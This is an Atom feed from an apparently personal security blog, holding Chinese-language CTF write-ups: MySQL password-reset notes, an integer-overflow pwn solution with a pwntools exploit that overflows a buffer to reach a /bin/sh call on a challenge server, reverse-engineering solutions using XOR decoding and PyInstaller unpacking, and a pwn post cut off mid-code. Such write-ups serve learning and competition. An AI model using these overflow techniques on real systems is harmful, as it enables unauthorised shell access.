<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Trick&#39;s Blog</title>
  
  
  <link href="https://trick.ink/atom.xml" rel="self"/>
  
  <link href="https://trick.ink/"/>
  <updated>2021-09-30T09:27:15.308Z</updated>
  <id>https://trick.ink/</id>
  
  <author>
    <name>Trick</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mysql</title>
    <link href="https://trick.ink/article/mysql/"/>
    <id>https://trick.ink/article/mysql/</id>
    <published>2021-09-30T08:07:11.000Z</published>
    <updated>2021-09-30T09:27:15.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="ssh连接服务器"><a href="#ssh连接服务器" class="headerlink" title="ssh连接服务器"></a>ssh连接服务器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ipaddress</span><br></pre></td></tr></table></figure><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>想修改密码，网上找到的指令，结果报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update user set password&#x3D;password(&#39;新密码&#39;) where user&#x3D;&#39;用户名&#39;;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;password&#39; in &#39;field list&#39;</span><br></pre></td></tr></table></figure><p>错误的原因是 5.7版本下的mysql数据库下已经没有password这个字段了，password字段改成了authentication_string</p><p>正确姿势：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;****&#39;) where user&#x3D;&#39;****&#39;;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 1</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MySQL&quot;&gt;&lt;a href=&quot;#MySQL&quot; class=&quot;headerlink&quot; title=&quot;MySQL&quot;&gt;&lt;/a&gt;MySQL&lt;/h1&gt;&lt;h2 id=&quot;ssh连接服务器&quot;&gt;&lt;a href=&quot;#ssh连接服务器&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="WriteUp/笔记" scheme="https://trick.ink/categories/WriteUp-%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>整形溢出</title>
    <link href="https://trick.ink/article/Shaping%20overflow/"/>
    <id>https://trick.ink/article/Shaping%20overflow/</id>
    <published>2021-09-28T19:45:18.795Z</published>
    <updated>2021-07-24T06:38:48.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span><h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p><p>先看ida</p><p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p><p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p><p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p><p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p><p>程序中给出了/bin/sh的地址</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Int8, 等于Byte, 占1个字节.</p><p>　   Int16, 等于short, 占2个字节. -32768 32767</p><p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p><p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p><p>   　这样, 看起来比short,int,long更加直观些!</p><p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p><p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p><p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p><p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;整形溢出&quot;&gt;&lt;a href=&quot;#整形溢出&quot; class=&quot;headerlink&quot; title=&quot;整形溢出&quot;&gt;&lt;/a&gt;整形溢出&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="整形溢出" scheme="https://trick.ink/tags/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯hxb_Re</title>
    <link href="https://trick.ink/article/hxb_Re/"/>
    <id>https://trick.ink/article/hxb_Re/</id>
    <published>2021-09-28T19:45:18.777Z</published>
    <updated>2021-07-24T06:39:27.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="湖湘杯hxb-Re"><a href="#湖湘杯hxb-Re" class="headerlink" title="湖湘杯hxb_Re"></a>湖湘杯hxb_Re</h1><span id="more"></span><h2 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h2><p><img src="https://img-blog.csdnimg.cn/2020111417004942.png#pic_center" alt="在这里插入图片描述"></p><p>长度32</p><p><img src="https://img-blog.csdnimg.cn/20201114170457298.png#pic_center" alt="在这里插入图片描述"></p><p>关键字符串</p><p><img src="https://img-blog.csdnimg.cn/20201114170212320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>v11是一个个字符<br>下面异或<br>写脚本<br>over<br>python_exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span></span><br><span class="line">v13 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v11 = <span class="built_in">ord</span>(<span class="built_in">str</span>[i:i+<span class="number">1</span>])</span><br><span class="line">    v13 += <span class="built_in">chr</span>(i ^ v11)</span><br><span class="line">    v11 ^= i</span><br><span class="line"><span class="built_in">print</span>(v13)</span><br></pre></td></tr></table></figure><p>java_exp: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String a = <span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> v11;</span><br><span class="line">        <span class="keyword">int</span> v13;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v11 = a.charAt(i);</span><br><span class="line">            v13 = i ^ (<span class="keyword">int</span>)v11;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>)v13);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag:<br>7e02a9c4439056df0e2a7b432b0069b3</p><h2 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h2><p>python反编译项目<br> 先下载：<br>链接: <a href="https://github.com/countercept/python-exe-unpacker">https://github.com/countercept/python-exe-unpacker</a></p><p>之后把要反编译的exe放到目录下<br>再执行下面的命令<br><code>python3 pyinstxtractor.py ReMe.exe</code></p><p><img src="https://img-blog.csdnimg.cn/20201114174957755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功之后如上图，并且在目录下会生成一个新的文件夹<br>进入被创建出来的文件夹，用winhex打开一个你软件名字的文件和一个名为struct的文件</p><p><img src="https://img-blog.csdnimg.cn/20201114175111142.png#pic_center" alt="在这里插入图片描述"><br>我们需要把目标文件也就是ReMe的头添加上struct中的16进制头数据</p><p><img src="https://img-blog.csdnimg.cn/20201114175807232.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020111417582892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>选中，右键-&gt;Edit-&gt;Copy Block-&gt;Hex Values<br>总之就是复制为16进制的数据<br><img src="https://img-blog.csdnimg.cn/2020111418030031.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>到ReMe中Crtl+v粘贴上<br>一下就是最终的效果<br><img src="https://img-blog.csdnimg.cn/20201114180437151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>保存之后添加pyc后缀名<br><img src="https://img-blog.csdnimg.cn/20201114180716119.png#pic_center" alt="在这里插入图片描述"><br>然后在终端安装uncompyle<br><code>pip install uncompyle</code></p><p>安装好之后在ReMe.pyc文件目录下执行：</p><p><code>uncompyle6 ReMe.pyc</code><br><img src="https://img-blog.csdnimg.cn/20201114181521899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>出现了源代码</p><p>可以用</p><p><code>uncompyle6 ReMe.pyc &gt; ReMe.py</code></p><p>生成py文件</p><p><img src="https://img-blog.csdnimg.cn/2020111418165395.png#pic_center" alt="在这里插入图片描述"></p><p>源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">num</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Your input is not the FLAG!&#x27;</span>)</span><br><span class="line">    inp = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(inp) != <span class="number">27</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length error!&#x27;</span>)</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(inp):</span><br><span class="line">        ret_list = func(<span class="built_in">ord</span>(ch))</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ret_list)):</span><br><span class="line">            s += <span class="built_in">str</span>(ret_list[idx])</span><br><span class="line">            s += <span class="built_in">str</span>(ret_list[(<span class="built_in">len</span>(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest() != check[i]:</span><br><span class="line">            sys.exit(i)</span><br><span class="line"></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(inp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You win!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5.hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">check = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">num</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">a = func(i)</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">s += <span class="built_in">str</span>(a[idx])</span><br><span class="line">s += <span class="built_in">str</span>(a[(<span class="built_in">len</span>(a) - idx - <span class="number">1</span>)])</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">b = md5.hexdigest()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line"><span class="keyword">if</span> b == check[j]:</span><br><span class="line"><span class="built_in">print</span> j,<span class="built_in">chr</span>(i)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span> +</span><br><span class="line"><span class="number">16</span> <span class="number">1</span></span><br><span class="line"><span class="number">13</span> <span class="number">3</span></span><br><span class="line"><span class="number">19</span> <span class="number">3</span></span><br><span class="line"><span class="number">24</span> <span class="number">5</span></span><br><span class="line"><span class="number">9</span> @</span><br><span class="line"><span class="number">5</span> M</span><br><span class="line"><span class="number">8</span> M</span><br><span class="line"><span class="number">18</span> R</span><br><span class="line"><span class="number">22</span> T</span><br><span class="line"><span class="number">14</span> X</span><br><span class="line"><span class="number">7</span> _</span><br><span class="line"><span class="number">12</span> _</span><br><span class="line"><span class="number">17</span> _</span><br><span class="line"><span class="number">21</span> _</span><br><span class="line"><span class="number">2</span> a</span><br><span class="line"><span class="number">23</span> e</span><br><span class="line"><span class="number">0</span> f</span><br><span class="line"><span class="number">3</span> g</span><br><span class="line"><span class="number">11</span> h</span><br><span class="line"><span class="number">1</span> l</span><br><span class="line"><span class="number">10</span> t</span><br><span class="line"><span class="number">25</span> t</span><br><span class="line"><span class="number">20</span> v</span><br><span class="line"><span class="number">6</span> y</span><br><span class="line"><span class="number">4</span> &#123;</span><br><span class="line"><span class="number">26</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>手动操作一下就ok</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;湖湘杯hxb-Re&quot;&gt;&lt;a href=&quot;#湖湘杯hxb-Re&quot; class=&quot;headerlink&quot; title=&quot;湖湘杯hxb_Re&quot;&gt;&lt;/a&gt;湖湘杯hxb_Re&lt;/h1&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>湖湘杯hxb_Pwn</title>
    <link href="https://trick.ink/article/hxb_Pwn/"/>
    <id>https://trick.ink/article/hxb_Pwn/</id>
    <published>2021-09-28T19:45:18.763Z</published>
    <updated>2021-07-24T06:39:33.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span><h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p><p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">n.sendline(<span 